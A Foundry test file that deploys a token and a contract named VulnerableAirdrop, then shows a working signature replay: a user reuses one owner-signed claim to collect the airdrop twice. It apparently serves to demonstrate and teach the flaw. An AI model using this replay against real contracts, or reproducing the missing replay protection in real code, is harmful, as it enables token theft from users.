// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {VulnerableAirdrop} from "../src/AirDrop.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MyToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("MyToken", "MTK") {
        _mint(msg.sender, initialSupply);
    }
}

contract TestAirDrop is Test{
    using ECDSA for bytes32;
    MyToken token;
    VulnerableAirdrop vulnerableAirdrop;
    address owner;
    address user;


    function setUp() public{
        owner = vm.addr(1);
        user = vm.addr(2);
        vm.startPrank(owner);
        token = new MyToken(1000000 ether);
        vulnerableAirdrop = new VulnerableAirdrop(address(token), owner);
        token.transfer(address(vulnerableAirdrop), 1000000 ether);
        vm.stopPrank();

    }

    function testReplayAttack() public {
        uint256 amount = 100 ether;
        uint256 nonce = 0;

        // Owner signs the message
        bytes32 messageHash = keccak256(abi.encodePacked(user, amount, nonce));
        bytes32 ethSignedMessageHash = vulnerableAirdrop.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, ethSignedMessageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.prank(user);
        vulnerableAirdrop.claimAirdrop(amount, nonce, signature);
        
        // Check balance after first claim
        assertEq(token.balanceOf(user), amount);

        // Replay the same signature
        vm.prank(user);
        vulnerableAirdrop.claimAirdrop(amount, nonce, signature);

        // Check balance after replay attack
        assertEq(token.balanceOf(user), amount * 2);
    }
}